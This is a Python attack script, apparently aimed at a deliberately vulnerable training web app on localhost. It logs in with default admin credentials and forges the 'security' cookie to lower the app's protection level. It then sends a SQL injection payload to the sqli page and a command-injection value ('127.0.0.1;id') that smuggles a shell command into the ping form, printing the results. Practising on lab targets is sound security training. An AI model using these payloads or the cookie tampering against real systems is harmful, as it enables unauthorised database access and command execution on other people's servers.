
import requests
import re

s = requests.Session()

# Login fresh (DB already initialized from previous run)
login_page = s.get('http://localhost:28080/login.php')
token_match = re.search(r"user_token.*?value='([a-f0-9]+)'", login_page.text)
token = token_match.group(1) if token_match else ""

login_data = {
    'username': 'admin',
    'password': 'password',
    'Login': 'Login',
    'user_token': token
}
login_resp = s.post('http://localhost:28080/login.php', data=login_data, allow_redirects=True)
print(f"[+] Login: {login_resp.status_code}, URL: {login_resp.url}")
print(f"[+] Cookies: {dict(s.cookies)}")

# Override security to low via cookie
s.cookies.set('security', 'low', domain='localhost', path='/')
print(f"[+] Overridden cookie to security=low")

# Test 1: Check what security level the server thinks we have
# by looking at the security.php page
sec_resp = s.get('http://localhost:28080/security.php')
if 'Security level is' in sec_resp.text:
    level_match = re.search(r'Security level is[^<]*<em>([^<]+)</em>', sec_resp.text)
    if level_match:
        actual_level = level_match.group(1)
        print(f"[!] Server reports security level: {actual_level}")
else:
    print("[!] Could not determine security level from page")

# Test 2: Try SQLi
sqli_url = "http://localhost:28080/vulnerabilities/sqli/"
resp = s.get(sqli_url, params={"id": "1' OR '1'='1", "Submit": "Submit"})
print(f"\n[*] SQLi response status: {resp.status_code}")
print(f"[*] SQLi response URL: {resp.url}")
print(f"[*] Response length: {len(resp.text)}")

# Look for all pre tags
pre_matches = re.findall(r'<pre>(.*?)</pre>', resp.text, re.DOTALL)
if pre_matches:
    print(f"\n🏆 SQLi RESULTS ({len(pre_matches)} entries):")
    for i, m in enumerate(pre_matches):
        print(f"  [{i}] {m.strip()[:200]}")
else:
    print("\n[-] No <pre> output found")
    # Check for "impossible" indicators
    if 'impossible' in resp.text.lower() or 'csrf' in resp.text.lower():
        print("[-] Possible impossible-level protection detected")
    # Look for any error or info messages
    divs = re.findall(r'<div[^>]*class="[^"]*"[^>]*>(.*?)</div>', resp.text, re.DOTALL)
    for d in divs:
        clean = re.sub(r'<[^>]+>', '', d).strip()
        if clean and len(clean) < 300:
            print(f"  msg: {clean}")
    
    # Print a snippet of the page body for debugging
    body_match = re.search(r'<div id="container">(.*?)<div id="footer">', resp.text, re.DOTALL)
    if body_match:
        body = re.sub(r'<[^>]+>', ' ', body_match.group(1))
        body = re.sub(r'\s+', ' ', body).strip()
        print(f"\n  Page body: {body[:500]}")

# Test 3: Try command injection as well
print(f"\n{'='*60}")
print("[*] Command Injection test...")
exec_url = "http://localhost:28080/vulnerabilities/exec/"
resp2 = s.get(exec_url, params={"ip": "127.0.0.1;id", "Submit": "Submit"})
pre2 = re.findall(r'<pre>(.*?)</pre>', resp2.text, re.DOTALL)
if pre2:
    print(f"🏆 CMD INJECTION RESULTS:")
    for m in pre2:
        print(f"  {m.strip()[:300]}")
else:
    print("[-] No command injection output")
    body_match2 = re.search(r'<div id="container">(.*?)<div id="footer">', resp2.text, re.DOTALL)
    if body_match2:
        body2 = re.sub(r'<[^>]+>', ' ', body_match2.group(1))
        body2 = re.sub(r'\s+', ' ', body2).strip()
        print(f"  Page body: {body2[:500]}")

